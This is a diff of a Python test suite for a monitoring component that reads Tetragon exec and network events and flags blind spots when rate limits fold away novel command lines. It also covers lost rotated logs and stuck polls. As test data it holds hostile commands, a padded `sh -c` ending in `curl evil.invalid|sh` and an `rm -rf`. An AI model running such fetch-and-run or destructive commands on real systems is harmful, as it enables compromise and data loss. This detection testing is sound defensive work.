@@ -1214,11 +1214,13 @@ def test_a_builds_repeated_command_is_a_risk_1_gap_not_a_blind_spot(
     assert reader.take_blind_spots() == {}  # a build must not stop a required agent
 
 
-def test_a_command_a_drained_bucket_turned_away_is_blind(
+def test_a_command_of_a_recorded_binary_a_drained_bucket_turned_away_is_risk_2_not_blind(
     tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
 ) -> None:
-    """M1: seed rm, drain the buckets with argv variants of /bin/true, then run rm -rf: it is
-    folded because the bucket was empty, not because of its own quota: risk 2 and blind."""
+    """M1, then T07-5: seed rm, drain the buckets with argv variants of /bin/true, then run
+    rm -rf: folded because the bucket was empty. Risk 2, but /bin/rm has an event of its own in
+    the window, so it is not a blind spot (a build must not stop a required agent): it is
+    alerted (take_unseen) instead."""
     reader = make_reader(
         exec_rate=0.001,
         exec_burst=1,
@@ -1237,9 +1239,10 @@ def test_a_command_a_drained_bucket_turned_away_is_blind(
     clock.advance(10)
     reader.poll()
     (lost,) = box.gaps("novelty_lost")
-    assert lost["class"] == "exec" and lost["events"] >= 1
+    assert lost["class"] == "exec" and lost["events"] >= 1 and lost["blind"] is False
     assert 2 in [e.risk for e in box.of("system", "sensor_gap")]
-    assert reader.take_blind_spots().get("novelty_lost") == 1
+    assert reader.take_blind_spots() == {}
+    assert "/bin/rm" in reader.take_unseen() and reader.take_unseen() == {}
 
 
 def test_the_first_event_of_each_binary_has_its_own_bucket(
@@ -1254,3 +1257,262 @@ def test_the_first_event_of_each_binary_has_its_own_bucket(
     reader.poll()
     targets = {e.target for e in box.of("exec", "exec")}
     assert {f"/usr/bin/tool{i}" for i in range(40)} <= targets
+
+
+# --- T07-5: an exact repeat, a build under required, a lost rotated file, the stall ---------
+
+
+def _padding(size: int) -> str:
+    """Text that does not fold (no run of one unit 16 times): the head the reader hashes."""
+    return "".join(f"{i:03d}," for i in range(size // 4 + 1))[:size]
+
+
+def test_a_shared_head_with_a_different_tail_is_not_a_repeat(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """T07-5: the novelty key was the first 256 characters of the argv, so a padded `sh -c`
+    followed by the same padding and `curl evil|sh` counted as a repeat (risk 1)."""
+    reader = make_reader(
+        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
+        first_rate=0.001, first_burst=1,
+    )  # fmt: skip
+    pad = _padding(250)
+    tetragon.write(
+        exec_line("x"),  # the bucket
+        exec_line("x"),  # the novelty bucket (a repeat of a recorded binary)
+        exec_line(f'-c "{pad}; true"', binary="/bin/sh"),  # the first-event bucket
+        exec_line(f'-c "{pad}; curl evil.invalid|sh"', binary="/bin/sh"),  # folded
+    )
+    reader.poll()
+    clock.advance(10)
+    reader.poll()
+    assert box.gaps("argv_folded") == []
+    (lost,) = box.gaps("novelty_lost")
+    assert lost["commands"] == 1 and lost["events"] == 1
+    assert [e.risk for e in box.of("system", "sensor_gap")] == [2]
+    # The digest that tells them apart is never stored.
+    stored = json.dumps([e.details for e in box.events])
+    assert "fingerprint" not in stored
+    assert not any(len(word) == 64 for word in stored.replace('"', " ").split())
+
+
+def test_an_exact_repeat_is_still_a_repeat(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_per_binary=1)
+    pad = _padding(3000)  # longer than what details["argv"] keeps
+    tetragon.write(*(exec_line(f"-c '{pad}; make'", binary="/bin/sh") for _ in range(6)))
+    reader.poll()
+    clock.advance(10)
+    reader.poll()
+    (folded,) = box.gaps("argv_folded")
+    assert folded["events"] == 4 and box.gaps("novelty_lost") == []
+
+
+def test_a_build_of_one_compiler_is_not_a_blind_spot(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """T07-5: under required, `make -j` (many distinct `cc -c` of one binary) drained the
+    novelty bucket and novelty_lost stopped the agent. The compiler has events of its own in
+    the window: risk 2 and an alert, not a blind spot."""
+    reader = make_reader(
+        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=2,
+        first_rate=0.001, first_burst=2,
+    )  # fmt: skip
+    tetragon.write(*(exec_line(f"-c f{i}.c -o f{i}.o", binary="/usr/bin/cc") for i in range(50)))
+    reader.poll()
+    clock.advance(10)
+    reader.poll()
+    (lost,) = box.gaps("novelty_lost")
+    assert lost["blind"] is False and lost["binaries"] == 1 and lost["events"] >= 40
+    assert reader.take_blind_spots() == {}
+    assert reader.take_unseen() == {"/usr/bin/cc": 1}
+    assert lost["names"] == ["/usr/bin/cc"]
+
+
+def test_a_binary_with_no_event_of_its_own_is_still_blind(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    reader = make_reader(
+        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
+        first_rate=0.001, first_burst=1,
+    )  # fmt: skip
+    tetragon.write(
+        exec_line("x"),
+        exec_line("a", binary="/usr/bin/cc"),  # the first-event bucket
+        exec_line("b", binary="/usr/bin/cc"),  # the novelty bucket
+        exec_line("c", binary="/usr/bin/cc"),  # folded: cc was recorded
+        exec_line("evil.invalid", binary="/usr/bin/curl"),  # folded: no event of curl
+    )
+    reader.poll()
+    clock.advance(10)
+    reader.poll()
+    blind = [g for g in box.gaps("novelty_lost") if g["blind"]]
+    seen = [g for g in box.gaps("novelty_lost") if not g["blind"]]
+    assert len(blind) == 1 and blind[0]["binaries"] == 1
+    assert len(seen) == 1 and seen[0]["binaries"] == 1
+    assert reader.take_blind_spots() == {"novelty_lost": 1}
+    assert reader.take_unseen() == {"/usr/bin/cc": 1}
+    assert blind[0]["names"] == ["/usr/bin/curl"]
+
+
+def test_a_rotated_file_lost_is_a_blind_spot(
+    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """T07-5: losing a rotated file was risk 2 but no alert and no stop under required."""
+    tetragon.write(exec_line("a"))
+    reader = make_reader(max_bytes_per_poll=1)
+    tetragon.write(exec_line("b"))
+    tetragon.rotate()
+    tetragon.write(exec_line("c"))
+    second = tetragon.rotate()
+    tetragon.write(exec_line("d"))
+    reader.poll()
+    second.unlink()
+    for _ in range(5000):
+        reader.poll()
+    assert len(box.gaps("rotated")) == 1
+    assert reader.take_blind_spots() == {"rotated": 1}
+
+
+def test_a_cursor_whose_file_is_gone_is_a_blind_spot(
+    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
+) -> None:
+    tetragon.write(exec_line("a"))
+    first = make_reader()
+    first.poll()
+    first.save_cursor()
+    first.close()
+    old = tetragon.rotate()
+    tetragon.rotate()
+    old.unlink()
+    second = make_reader()
+    second.poll()
+    assert second.take_blind_spots() == {"rotated": 1}
+
+
+class BlockingBox(Box):
+    """A black box whose append waits on an Event: a poll stuck for real."""
+
+    def __init__(self) -> None:
+        super().__init__()
+        self.entered = threading.Event()
+        self.release = threading.Event()
+
+    def append(self, *args: Any, **kwargs: Any) -> object:
+        self.entered.set()
+        assert self.release.wait(10)
+        return super().append(*args, **kwargs)
+
+
+def test_a_poll_stuck_for_real_is_blocked_and_the_lock_can_be_tried(
+    tmp_path: Path, tetragon: Tetragon
+) -> None:
+    """T07-5: blocked() sees a real stuck poll; held(timeout) gives up instead of waiting."""
+    box = BlockingBox()
+    config = ReaderConfig(events_dir=tetragon.events, cursor_file=tmp_path / "cursor.json")
+    reader = TetragonReader(config, box, agent_id=TARGET_ID)
+    tetragon.write(exec_line("stuck"))
+    stuck = threading.Thread(target=reader.poll, daemon=True)
+    stuck.start()
+    try:
+        assert box.entered.wait(5)
+        assert reader.blocked(0.0)
+        start = time.monotonic()
+        with reader.held(0.2) as got:
+            assert got is False
+        assert time.monotonic() - start < 2
+        assert reader.wait_seen("backtide-hb-" + "0" * 32, 0.2) is False  # never hangs
+    finally:
+        box.release.set()
+        stuck.join(5)
+    assert not reader.blocked(0.0)
+    with reader.held(0.2) as got:
+        assert got is True
+
+
+def test_a_second_poller_waiting_for_the_lock_does_not_clear_the_first_ones_mark(
+    tmp_path: Path, tetragon: Tetragon
+) -> None:
+    """T07-5: polling_since is set inside the lock and cleared only by the poll that set it."""
+    box = BlockingBox()
+    config = ReaderConfig(events_dir=tetragon.events, cursor_file=tmp_path / "cursor.json")
+    reader = TetragonReader(config, box, agent_id=TARGET_ID)
+    tetragon.write(exec_line("stuck"))
+    first = threading.Thread(target=reader.poll, daemon=True)
+    first.start()
+    assert box.entered.wait(5)
+    since = reader.polling_since
+    second = threading.Thread(target=reader.poll, daemon=True)
+    second.start()
+    time.sleep(0.2)  # the second waits for the lock
+    assert reader.polling_since == since  # not overwritten by the one waiting
+    box.release.set()
+    first.join(5)
+    second.join(5)
+    assert reader.polling_since is None
+
+
+def test_a_poll_returns_after_its_time_budget(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """A poll with much to read gives the lock back after poll_time_budget."""
+    reader = make_reader(read_size=4096, poll_time_budget=2.0)
+    tetragon.write(*(exec_line(f"n{i}") for i in range(50)))
+    real_read = reader._read
+
+    def slow_read(budget: int) -> int:
+        clock.advance(0.5)  # every read takes half a second
+        return real_read(budget)
+
+    reader._read = slow_read  # type: ignore[method-assign]
+    first = reader.poll()
+    assert 0 < first < 50  # stopped at the budget, more left to read
+    while reader.poll():
+        pass
+    assert len(box.argvs()) == 50
+
+
+def test_a_connection_to_a_new_target_is_not_a_repeat(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """T07-5 review: every connection of a binary was one 'command' for novelty, so a direct
+    connection to a new address after a flood to the proxy counted as a repeat (risk 1)."""
+    reader = make_reader(
+        net_rate=0.001, net_burst=1, novel_rate=0.001, novel_burst=1,
+        first_rate=0.001, first_burst=1,
+    )  # fmt: skip
+    usual = json.loads(raw("connect_tcp4"))
+    other = copy.deepcopy(usual)
+    for arg in other["process_kprobe"]["args"]:
+        if "sockaddr_arg" in arg:
+            arg["sockaddr_arg"]["addr"] = "198.51.100.7"
+    tetragon.write(*([json.dumps(usual)] * 8), json.dumps(other))
+    reader.poll()
+    clock.advance(10)
+    reader.poll()
+    (lost,) = box.gaps("novelty_lost")
+    assert lost["class"] == "net" and lost["commands"] == 1 and lost["events"] == 1
+
+
+def test_a_streak_of_windows_with_unseen_command_lines_is_measured(
+    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
+) -> None:
+    """The founder's decision B (2026-10-19): how long novelty_lost {blind: false} has gone on
+    without a window free of it. A window without one resets it."""
+    reader = make_reader(
+        exec_rate=0.001, exec_burst=1, novel_rate=0.001, novel_burst=1,
+        first_rate=0.001, first_burst=100,
+    )  # fmt: skip
+    # Each window: cc's first event recorded (its own bucket), the rest of its distinct
+    # command lines folded unseen.
+    assert reader.unseen_streak() == 0
+    for window in range(4):
+        tetragon.write(*(exec_line(f"-c f{window}-{i}.c", binary="/usr/bin/cc") for i in range(6)))
+        reader.poll()
+        clock.advance(10)
+        reader.poll()
+    assert reader.unseen_streak() >= 30
+    clock.advance(10)
+    reader.poll()  # a whole window with nothing folded unseen
+    assert reader.unseen_streak() == 0
